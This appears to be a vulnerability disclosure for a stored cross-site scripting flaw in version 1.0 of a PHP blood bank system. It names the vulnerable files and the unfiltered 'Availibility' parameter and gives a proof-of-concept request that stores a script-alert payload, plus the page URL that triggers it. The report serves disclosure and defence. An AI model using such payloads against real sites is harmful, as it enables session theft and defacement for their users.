# blood-bank-system-in-php via Availibility parameter Cross Site Scripting

[Blood Bank System In PHP With Source Code - Source Code & Projects (code-projects.org)](https://code-projects.org/blood-bank-system-in-php-with-source-code/)

## NAME OF AFFECTED PRODUCT(S)

**blood-bank-system-in-php**

## Vendor Homepage

https://code-projects.org/blood-bank-system-in-php-with-source-code/

##  **Manufacturers sites**

https://code-projects.org/

# AFFECTED  VERSION(S)

## Vulnerable File

admin/blood/update/o-.php and blooddetails.php Availibility parameter.

## VERSION(S)

-  v1.0

## Software Link

https://download.code-projects.org/details/09f1f26e-072d-4fec-bd3b-974076ee162c

# PROBLEM TYPE

## Vulnerability Type

Cross Site Scripting

## **Description of the vulnerability**

admin/blood/update/o-.php，insert $Availibility paremeter into bloodgroup table. and echo the $Availibility value in not filter.

![image-20241005224046096](https://github.com/user-attachments/assets/befdfd67-148a-4624-bda6-514a54ac3400)s

echo the $Availibility value in not filter.

![image-20241005224128195](https://github.com/user-attachments/assets/82f506a4-ef15-4f2e-9b32-b9c225b59ecf)

## **Vulnerability recurrence**

### **POC**

Just need to execute the POC and insert the xss code into the database

```
http://bloodbankmgmtsystem/admin/blood/update/o-.php
bloodname=1&unit=1&Availibility=<script>alert("AvailibilityXss");</script>
```

![image-20241005224314920](https://github.com/user-attachments/assets/da94f348-9c26-41ce-9345-dd2c36426b78)

### Result

We can trigger the XSS vulnerability that was just inserted by accessing  bbms.php. 

```
http://bloodbankmgmtsystem/blooddetails.php
```

![image-20241005224425059](https://github.com/user-attachments/assets/423430a7-4ee9-4201-9bed-1d12f8a9f3f0)